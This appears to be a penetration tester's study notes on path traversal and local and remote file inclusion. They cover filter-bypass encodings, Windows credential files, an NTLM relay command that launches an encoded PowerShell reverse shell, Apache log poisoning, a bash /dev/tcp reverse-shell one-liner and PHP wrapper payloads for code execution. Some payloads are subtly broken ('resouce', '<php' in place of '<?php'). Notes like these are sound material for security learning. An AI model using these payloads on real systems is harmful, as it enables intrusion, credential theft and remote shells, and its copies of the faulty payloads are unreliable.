### Path Traversal

**Path Traversal with Other Returned Content Types**
- Sometimes the app will return something like `/etc/passwd` in `image/jpeg` format
  - Firefox does NOT like this and will not show the contents of the image, instead displaying an error
    - Viewing the network request has a similar result
  - Thus, must be viewed via something showing the raw response (like burp or curl)

**Bypassing traversal defenses**
- Try using absolute paths
- Try using `....//` if `../` is stripped
- Try encoding the data:
  - `%2f` for `/` and `%2e` for `.` 

**Windows Directory Traversal**
- Test Windows traversal with `C:\Windows\System32\drivers\etc\hosts` (if win.ini not working)
- DT to system access on Windows:
	- Look in home directories for `.ssh`
	- IIS server: 
		- `C:\inetpub\logs\LogFiles\W3SVC1\` is logs
		- `C:\inetpub\wwwroot\web.config` - config w/ potential creds
- Also, if we can pass IPs, use for stealing NTLM hash
	- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t {relay_target_IP} -c "powershell -enc {reverse_shell}"`

**File Inclusion**
- Different from directory traversal - directory traversal refers to simply retrieving contents, whereas LFI means the contents of the file are executed
- LFI example attack path
	- Can access local files with ?page=
	- Apache's /var/log/apache2/access.log logs the HTTP User Agent of everyone connecting
	- Thus, we can connect to a site with php code in our User Agent, poisoning the log, and view the access log with the LFI, resulting in the code executing
	- Can turn into a reverse shell with `bash -i >& /dev/tcp/{IP}/4444 0>&1`
		- If executed with Bourne Shell, we can prepend `bash -c` to ensure shell uses bash
- PHP wrappers can be used to display PHP when it would have otherwise executed
	- php://filter/convert.base64-encode/resouce=admin.php
	- data:// wrapper can be used for code execution
		- `data://text/plain,<php echo system('ls'); ?>` in an LFI could cause RCE
		- b64 version: `data://text/plain;base64,`
- Remote File Inclusion - very similar, but rare - passing PHP file as an HTTP link
- Things to include:
	- **/var/www/html/backup.php**
	- **/opt/admin.bak.php**
	- **/opt/install.txt** (or **C:\\Users\\install.txt**)
	- **/opt/passwords**
